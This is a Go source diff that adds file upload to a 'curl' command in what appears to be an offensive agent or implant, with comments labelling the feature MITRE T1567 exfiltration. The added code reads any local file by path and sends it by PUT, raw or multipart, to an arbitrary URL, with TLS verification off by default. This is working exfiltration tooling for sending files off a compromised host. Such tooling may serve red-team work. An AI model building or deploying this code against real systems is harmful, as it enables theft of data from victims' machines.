@@ -1,12 +1,16 @@
 package commands
 
 import (
+	"bytes"
 	"context"
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"io"
+	"mime/multipart"
 	"net/http"
+	"os"
+	"path/filepath"
 	"strings"
 	"time"
 
@@ -25,6 +29,8 @@ type curlArgs struct {
 	Method   string          `json:"method"`   // GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH
 	Headers  json.RawMessage `json:"headers"`  // custom headers — JSON string or map
 	Body     string          `json:"body"`     // request body for POST/PUT/PATCH
+	File     string          `json:"file"`     // file path to upload as request body (T1567 exfiltration)
+	Upload   string          `json:"upload"`   // upload mode: "raw" (default, file as body) or "multipart" (multipart/form-data)
 	Insecure bool            `json:"insecure"` // skip TLS verification (default: true)
 	Timeout  int             `json:"timeout"`  // timeout in seconds (default: 30)
 	MaxSize  int             `json:"max_size"` // max response body size in bytes (default: 1MB)
@@ -100,9 +106,57 @@ func (c *CurlCommand) Execute(task structs.Task) structs.CommandResult {
 		Timeout:   time.Duration(args.Timeout) * time.Second,
 	}
 
-	// Build request
+	// Build request body — file upload or inline body
 	var bodyReader io.Reader
-	if args.Body != "" {
+	var fileSize int64
+	var contentType string
+
+	if args.File != "" {
+		// File upload mode (T1567 — Exfiltration Over Web Service)
+		filePath, err := filepath.Abs(args.File)
+		if err != nil {
+			return errorf("Error resolving file path: %v", err)
+		}
+		fileInfo, err := os.Stat(filePath)
+		if err != nil {
+			return errorf("Error accessing file: %v", err)
+		}
+		fileSize = fileInfo.Size()
+
+		if strings.ToLower(args.Upload) == "multipart" {
+			// Multipart form-data upload
+			var buf bytes.Buffer
+			writer := multipart.NewWriter(&buf)
+			part, err := writer.CreateFormFile("file", filepath.Base(filePath))
+			if err != nil {
+				return errorf("Error creating multipart form: %v", err)
+			}
+			fileData, err := os.ReadFile(filePath)
+			if err != nil {
+				return errorf("Error reading file: %v", err)
+			}
+			if _, err := part.Write(fileData); err != nil {
+				return errorf("Error writing multipart data: %v", err)
+			}
+			writer.Close()
+			bodyReader = &buf
+			contentType = writer.FormDataContentType()
+		} else {
+			// Raw file upload (default — S3 presigned URLs, Azure SAS, generic PUT)
+			f, err := os.Open(filePath)
+			if err != nil {
+				return errorf("Error opening file: %v", err)
+			}
+			defer f.Close()
+			bodyReader = f
+			contentType = "application/octet-stream"
+		}
+
+		// Default to PUT for file uploads if method not specified
+		if args.Method == "GET" {
+			args.Method = "PUT"
+		}
+	} else if args.Body != "" {
 		bodyReader = strings.NewReader(args.Body)
 	}
 
@@ -112,6 +166,11 @@ func (c *CurlCommand) Execute(task structs.Task) structs.CommandResult {
 	req, err := http.NewRequestWithContext(ctx, args.Method, args.URL, bodyReader)
 	if err != nil {
 		return errorf("Error creating request: %v", err)
+	}
+
+	// Set content type for file uploads (before custom headers so they can override)
+	if contentType != "" {
+		req.Header.Set("Content-Type", contentType)
 	}
 
 	// Set custom headers
@@ -184,6 +243,17 @@ func (c *CurlCommand) Execute(task structs.Task) structs.CommandResult {
 		if !strings.HasSuffix(string(body), "\n") {
 			sb.WriteString("\n")
 		}
+	}
+
+	// Add upload summary if a file was uploaded
+	if args.File != "" && fileSize > 0 {
+		sb.WriteString(fmt.Sprintf("\n--- Upload Summary ---\nFile: %s (%d bytes)\nMethod: %s\nUpload mode: %s\n",
+			args.File, fileSize, args.Method, func() string {
+				if strings.ToLower(args.Upload) == "multipart" {
+					return "multipart/form-data"
+				}
+				return "raw (application/octet-stream)"
+			}()))
 	}
 
 	status := "success"
